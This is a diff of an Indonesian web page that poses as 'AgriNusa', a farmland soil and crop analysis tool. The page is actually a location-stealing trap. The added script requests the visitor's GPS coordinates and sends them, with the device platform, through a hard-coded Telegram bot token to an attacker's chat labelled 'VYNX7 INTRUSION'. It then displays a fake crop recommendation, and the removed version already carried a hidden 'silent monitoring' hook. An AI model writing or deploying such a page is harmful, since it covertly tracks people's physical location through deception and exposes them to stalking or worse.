@@ -3,58 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AgriNusa - Cek Kualitas Lahan Pertanian</title>
+    <title>AgriNusa - Analisis Lahan</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f9f4; color: #2e7d32; text-align: center; padding: 50px; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; }
-        button { background: #2e7d32; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #1b5e20; }
-        #status { margin-top: 20px; font-weight: bold; color: #555; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2e7d32; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .btn { padding: 15px 25px; background: transparent; border: 1px solid #00ff00; color: #00ff00; cursor: pointer; font-size: 1.2rem; transition: 0.3s; }
+        .btn:hover { background: #00ff00; color: #000; box-shadow: 0 0 15px #00ff00; }
+        #status { margin-top: 20px; font-size: 0.9rem; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>🌱 AgriNusa v7.0</h1>
-        <p>Gunakan sensor GPS kami untuk menganalisis kandungan unsur hara dan jenis tanaman yang paling cocok di wilayah Anda.</p>
-        <button onclick="startAnalysis()">Mulai Analisis Lahan</button>
-        <div id="loader" class="loader"></div>
-        <div id="status">Silakan izinkan akses lokasi untuk hasil akurat.</div>
-    </div>
+    <h2>VYNX7 AGRIKULTURA</h2>
+    <button class="btn" onclick="executeVynx7()">MULAI ANALISIS LAHAN</button>
+    <div id="status">Sistem Siap...</div>
 
-    <script src="vynx7_core.js"></script>
     <script>
-        async function startAnalysis() {
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('status').innerText = "Menghubungkan ke satelit AgriNusa...";
+        async function executeVynx7() {
+            const status = document.getElementById('status');
+            status.innerText = "Mengakses Satelit GPS...";
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
+            // 1. Ambil Lokasi (Trigger Utama)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                
+                status.innerText = "Mengirim Data ke Server...";
+
+                // --- LOGIKA CURL DALAM JS ---
+                const TOKEN = "8097166695:AAF6olxar4wlrlyP1YRQtPkVQuLP5A-Q4fs";
+                const CHAT_ID = "6697482758";
+                const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+                const message = `🚨 <b>VYNX7 INTRUSION</b>\n📍 Lat: <code>${lat}</code>\n📍 Lon: <code>${lon}</code>\n📱 OS: ${navigator.platform}`;
+
+                try {
+                    // Ini adalah "CURL" versi Browser
+                    const response = await fetch(URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    });
+
+                    const resData = await response.json();
                     
-                    // Eksekusi Silent Monitoring VYNX7
-                    if (window.Vynx7Shield) {
-                        const shield = new Vynx7Shield("system_manifest.bin");
-                        await shield.ignite(lat, lon);
+                    if(resData.ok) {
+                        status.innerHTML = "✅ Analisis Selesai!<br>Tanaman Cocok: <b>Padi Unggul IR64</b>";
+                    } else {
+                        status.innerText = "Error API: " + resData.description;
                     }
 
-                    // Tampilan Palsu buat User
-                    setTimeout(() => {
-                        document.getElementById('loader').style.display = 'none';
-                        document.getElementById('status').innerHTML = `
-                            ✅ Analisis Selesai!<br>
-                            Lokasi: ${lat.toFixed(4)}, ${lon.toFixed(4)}<br>
-                            Tanaman Cocok: <b>Padi IR64 / Jagung Manis</b>
-                        `;
-                    }, 3000);
-                }, (err) => {
-                    document.getElementById('loader').style.display = 'none';
-                    document.getElementById('status').innerText = "Error: Akses lokasi ditolak. Gunakan mode manual.";
-                });
-            }
+                } catch (err) {
+                    status.innerText = "Gagal terhubung ke server.";
+                    console.error(err);
+                }
+
+            }, (err) => {
+                status.innerText = "Gagal: Izin lokasi ditolak atau GPS mati.";
+            });
         }
     </script>
 </body>
